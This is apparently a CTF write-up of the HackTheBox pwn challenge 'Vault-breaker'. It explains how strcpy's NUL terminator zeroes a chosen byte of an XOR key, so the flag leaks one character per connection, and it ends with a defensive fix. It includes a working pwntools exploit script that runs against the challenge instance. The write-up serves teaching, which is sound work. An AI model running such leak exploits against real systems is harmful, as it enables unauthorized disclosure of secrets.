---
title: "Vault-breaker"
date: 2027-01-01 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, strcpy, null-termination, xor, info-leak]
description: "A Very Easy Pwn challenge with no memory-corruption primitive at all. The binary XORs the flag against a /dev/urandom keystream, but lets you choose the length copied into the key buffer with strcpy — and strcpy's NUL terminator zeroes the key byte at the index you pick. A zero key byte makes the XOR output equal the raw flag byte, so the flag leaks one character per connection."
---

## Overview

Vault-breaker is a Very Easy [Pwn](https://app.hackthebox.com/challenges) challenge. There is no buffer overflow, no ROP, no format string — just a logic bug in how a key buffer is built. The program XORs the flag against a random keystream and prints the result, but it rebuilds that keystream with `strcpy` using a length *you* control. Because `strcpy` always writes a terminating NUL, you can force a known-zero byte at any index of the key, and a zero key byte leaks the raw flag character at that position.

## The technique

The binary keeps a 32-byte global `random_key`, filled from `/dev/urandom` at startup. The menu has two relevant options:

1. **Generate new key** — asks for a length `0..31`, reads that many *non-zero* bytes from `/dev/urandom` into a local buffer (it re-reads over any NUL), then `strcpy(random_key, buf)`.
2. **Secure the Vault** — reads `flag.txt` and prints `flag[i] ^ random_key[i]` for each byte, then `exit()`s.

The local buffer is zero-initialised and only `len` non-zero bytes are written, so `buf[len] == 0`. `strcpy` copies those `len` bytes **and** the terminating NUL — landing a zero at `random_key[len]`:

```
random_key[len] == 0      # len is attacker-controlled
```

A keystream is binary data, not a C string. String-copying it injects a known-zero byte at an index you choose. When option 2 then XORs the flag against the key:

```
output[len] = flag[len] ^ random_key[len] = flag[len] ^ 0 = flag[len]
```

Every other output byte is XORed against an unknown random byte (garbage), but the byte at index `len` is the raw flag character. Since option 2 calls `exit()`, you get one leak per connection — so reconnect for each index. This is [improper null termination](https://cwe.mitre.org/data/definitions/170.html) feeding a known-plaintext information leak.

## Solution

Set the key length to `i` (zeroing `random_key[i]`), trigger the XOR print, and read output byte `i`. Loop until `}`.

Create `solve.py`:

```python
import sys
from pwn import remote, context

context.log_level = "warning"
HOST, PORT = sys.argv[1], int(sys.argv[2])

flag = bytearray()
i = 0
while i < 31:
    p = remote(HOST, PORT)
    p.recvuntil(b"> ")
    p.sendline(b"1")                 # 1. Generate new key
    p.recvuntil(b"): ")
    p.sendline(str(i).encode())      # length N = i  -> random_key[i] = 0
    p.recvuntil(b"> ")
    p.sendline(b"2")                 # 2. Secure the Vault (leak + exit)
    p.recvuntil(b"Master password for Vault: ")
    data = p.recvn(i + 1)            # output[i] == flag[i] ^ 0 == flag[i]
    p.close()
    flag.append(data[i])
    sys.stdout.write(chr(data[i])); sys.stdout.flush()
    if data[i] == ord("}"):
        break
    i += 1

print("\n[+] FLAG:", flag.decode(errors="replace"))
```

Run it against the instance:

```bash
python3 solve.py <host> <port>
```

The flag prints one character per connection:

```
HTB{...}
[+] FLAG: HTB{...}
```

## Why it worked

The author treated a cryptographic keystream as a NUL-terminated C string. `strcpy` is safe for strings but wrong for key material: it both truncates at the first zero and plants a zero terminator — and here that terminator's position is fully attacker-controlled. A single zero key byte collapses the XOR mask at that index, turning a "secure" XOR routine into a one-character-at-a-time oracle.

## Fix / defense

Never `strcpy` into key material. Generate the key once at full width with `memcpy`/`read`, and never let user input set its effective length:

```c
unsigned char key[32];
if (read(urandom, key, sizeof key) != sizeof key) abort();   // full-width binary key
// no strcpy into key, no user-controlled length
for (i = 0; i < len; i++) putchar(flag[i] ^ key[i]);
```
